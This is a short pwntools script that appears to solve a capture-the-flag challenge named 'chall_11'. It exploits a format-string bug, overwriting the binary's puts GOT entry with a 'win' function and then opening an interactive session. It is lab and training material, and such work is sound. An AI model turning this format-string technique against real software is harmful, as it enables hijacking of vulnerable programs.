#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_11')

p = process(binary.path)

# p.sendline()

offset = 7
payload = fmtstr_payload(offset,{binary.got.puts:binary.sym.win})
print(payload)
p.sendline(payload)


null = payload.find(b'\x00')
print(payload[null-3:null])
p.recvuntil(payload[null-3:null])

p.interactive()
